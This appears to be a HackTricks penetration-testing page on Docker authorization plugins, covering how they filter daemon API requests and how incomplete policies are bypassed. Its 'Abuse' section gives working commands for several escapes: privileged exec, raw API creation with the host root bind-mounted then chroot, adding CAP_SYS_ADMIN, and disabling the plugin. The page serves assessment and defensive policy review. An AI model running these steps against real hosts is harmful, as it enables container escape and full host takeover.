_body: "# Runtime Authorization Plugins\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Overview\n\nRuntime\
  \ authorization plugins are an extra policy layer that decides whether a caller may perform a given daemon action. Docker\
  \ is the classic example. By default, anyone who can talk to the Docker daemon effectively has broad control over it. Authorization\
  \ plugins try to narrow that model by examining the authenticated user and the requested API operation, then allowing or\
  \ denying the request according to policy.\n\nThis topic deserves its own page because it changes the exploitation model\
  \ when an attacker already has access to a Docker API or to a user in the `docker` group. In such environments the question\
  \ is no longer only \"can I reach the daemon?\" but also \"is the daemon fenced by an authorization layer, and if so, can\
  \ that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?\"\n\n## Operation\n\
  \nWhen a request reaches the Docker daemon, the authorization subsystem can pass the request context to one or more installed\
  \ plugins. The plugin sees the authenticated user identity, the request details, selected headers, and parts of the request\
  \ or response body when the content type is suitable. Multiple plugins can be chained, and access is granted only if all\
  \ plugins allow the request.\n\nThis model sounds strong, but its safety depends entirely on how completely the policy author\
  \ understood the API. A plugin that blocks `docker run --privileged` but ignores `docker exec`, misses alternate JSON keys\
  \ such as top-level `Binds`, or allows plugin administration may create a false sense of restriction while still leaving\
  \ direct privilege-escalation paths open.\n\n## Common Plugin Targets\n\nImportant areas for policy review are:\n\n- container\
  \ creation endpoints\n- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing\
  \ options\n- `docker exec` behavior\n- plugin management endpoints\n- any endpoint that can indirectly trigger runtime actions\
  \ outside the intended policy model\n\nHistorically, examples such as Twistlock's `authz` plugin and simple educational\
  \ plugins such as `authobot` made this model easy to study because their policy files and code paths showed how endpoint-to-action\
  \ mapping was actually implemented. For assessment work, the important lesson is that the policy author must understand\
  \ the full API surface rather than only the most visible CLI commands.\n\n## Abuse\n\nThe first goal is to learn what is\
  \ actually blocked. If the daemon denies an action, the error often leaks the plugin name, which helps identify the control\
  \ in use:\n\n```bash\ndocker ps\ndocker run --rm -it --privileged ubuntu:24.04 bash\ndocker plugin ls\n```\n\nIf you need\
  \ broader endpoint profiling, tools such as `docker_auth_profiler` are useful because they automate the otherwise repetitive\
  \ task of checking which API routes and JSON structures are really permitted by the plugin.\n\nIf the environment uses a\
  \ custom plugin and you can interact with the API, enumerate which object fields are really filtered:\n\n```bash\ndocker\
  \ version\ndocker inspect <container> 2>/dev/null | head\ncurl --unix-socket /var/run/docker.sock http:/version\ncurl --unix-socket\
  \ /var/run/docker.sock http:/v1.41/containers/json\n```\n\nThese checks matter because many authorization failures are field-specific\
  \ rather than concept-specific. A plugin may reject a CLI pattern without fully blocking the equivalent API structure.\n\
  \n### Full Example: `docker exec` Adds Privilege After Container Creation\n\nA policy that blocks privileged container creation\
  \ but allows unconfined container creation plus `docker exec` may still be bypassed:\n\n```bash\ndocker run -d --security-opt\
  \ seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity\ndocker ps\ndocker exec -it --privileged\
  \ <container_id> bash\n```\n\nIf the daemon accepts the second step, the user has recovered a privileged interactive process\
  \ inside a container the policy author believed was constrained.\n\n### Full Example: Bind Mount Through Raw API\n\nSome\
  \ broken policies inspect only one JSON shape. If the root filesystem bind mount is not blocked consistently, the host can\
  \ still be mounted:\n\n```bash\ndocker version\ncurl --unix-socket /var/run/docker.sock \\\n  -H \"Content-Type: application/json\"\
  \ \\\n  -d '{\"Image\":\"ubuntu:24.04\",\"Binds\":[\"/:/host\"]}' \\\n  http:/v1.41/containers/create\ndocker start <container_id>\n\
  docker exec -it <container_id> chroot /host /bin/bash\n```\n\nThe same idea may also appear under `HostConfig`:\n\n```bash\n\
  curl --unix-socket /var/run/docker.sock \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"Image\":\"ubuntu:24.04\"\
  ,\"HostConfig\":{\"Binds\":[\"/:/host\"]}}' \\\n  http:/v1.41/containers/create\n```\n\nThe impact is a full host filesystem\
  \ escape. The interesting detail is that the bypass comes from incomplete policy coverage rather than from a kernel bug.\n\
  \n### Full Example: Unchecked Capability Attribute\n\nIf the policy forgets to filter a capability-related attribute, the\
  \ attacker may create a container that regains a dangerous capability:\n\n```bash\ncurl --unix-socket /var/run/docker.sock\
  \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"Image\":\"ubuntu:24.04\",\"HostConfig\":{\"CapAdd\":[\"SYS_ADMIN\"\
  ]}}' \\\n  http:/v1.41/containers/create\ndocker start <container_id>\ndocker exec -it <container_id> bash\ncapsh --print\n\
  ```\n\nOnce `CAP_SYS_ADMIN` or a similarly strong capability is present, many breakout techniques described in [capabilities.md](protections/capabilities.md)\
  \ and [privileged-containers.md](privileged-containers.md) become reachable.\n\n### Full Example: Disabling The Plugin\n\
  \nIf plugin-management operations are allowed, the cleanest bypass may be to turn the control off entirely:\n\n```bash\n\
  docker plugin ls\ndocker plugin disable <plugin_name>\ndocker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host\
  \ /bin/bash\ndocker plugin enable <plugin_name>\n```\n\nThis is a policy failure at the control-plane level. The authorization\
  \ layer exists, but the user it was supposed to restrict still retains permission to disable it.\n\n## Checks\n\nThese commands\
  \ are aimed at identifying whether a policy layer exists and whether it seems to be complete or superficial.\n\n```bash\n\
  docker plugin ls\ndocker info 2>/dev/null | grep -i authorization\ndocker run --rm -it --privileged ubuntu:24.04 bash\n\
  curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null\n```\n\nWhat is interesting here:\n\n- Denial messages\
  \ that include a plugin name confirm an authorization layer and often reveal the exact implementation.\n- A plugin list\
  \ visible to the attacker may be enough to discover whether disable or reconfigure operations are possible.\n- A policy\
  \ that blocks only obvious CLI actions but not raw API requests should be treated as bypassable until proven otherwise.\n\
  \n## Runtime Defaults\n\n| Runtime / platform | Default state | Default behavior | Common manual weakening |\n| --- | ---\
  \ | --- | --- |\n| Docker Engine | Not enabled by default | Daemon access is effectively all-or-nothing unless an authorization\
  \ plugin is configured | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level\
  \ blind spots |\n| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless\
  \ execution, and API exposure decisions than on Docker-style authz plugins | exposing a rootful Podman API broadly, weak\
  \ socket permissions |\n| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions,\
  \ node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | mounting the socket into\
  \ workloads, weak node-local trust assumptions |\n| Kubernetes | Uses authn/authz at the API-server and kubelet layers,\
  \ not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | overbroad RBAC, weak admission\
  \ policy, exposing kubelet or runtime APIs directly |\n{{#include ../../../banners/hacktricks-training.md}}"
